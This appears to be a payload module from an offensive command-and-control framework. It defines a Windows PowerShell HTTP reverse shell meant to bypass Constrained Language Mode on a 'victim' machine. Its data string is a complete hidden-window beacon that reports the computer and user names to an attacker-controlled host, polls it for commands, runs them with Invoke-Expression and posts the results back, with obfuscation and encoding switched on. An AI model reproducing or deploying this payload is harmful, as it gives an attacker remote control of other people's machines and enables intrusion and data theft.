# This module is part of the Shakamura framework

class Payload:

    info = {
        'Title' : 'Windows PowerShell IEX Shakamura - Constraint Language Mode',
        'Author' : 'Panagiotis Chartas (r0jahsm0ntar1)',
        'Description' : 'An Http based beacon-like reverse shell that utilizes IEX and will work even if Constraint Language Mode is enabled on the victim',
        'References' : ['https://github.com/r0jahsm0ntar1/shakamura', 'https://revshells.com']
    }

    meta = {
        'handler' : 'shakamura',
        'type' : 'ps-iex-cm',
        'os' : 'windows',
        'shell' : 'powershell.exe'
    }

    config = {
        'frequency' : 0.8
    }

    parameters = {
        'lhost' : None
    }

    attrs = {
        'obfuscate' : True,
        'encode' : True
    }

    data = "Start-Process $PSHOME\powershell.exe -ArgumentList {$ConfirmPreference='None';$s='*LHOST*';$i='*SESSIONID*';$p='http://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/*VERIFY*/$env:COMPUTERNAME/$env:USERNAME -Headers @{\"*HOAXID*\"=$i};for (;;){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/*GETCMD* -Headers @{\"*HOAXID*\"=$i});if ($c -ne 'None') {$r=Invoke-Expression $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod -Uri $p$s/*POSTRES* -Method POST -Headers @{\"*HOAXID*\"=$i} -Body ($e+$r)} sleep *FREQ*}} -WindowStyle Hidden"
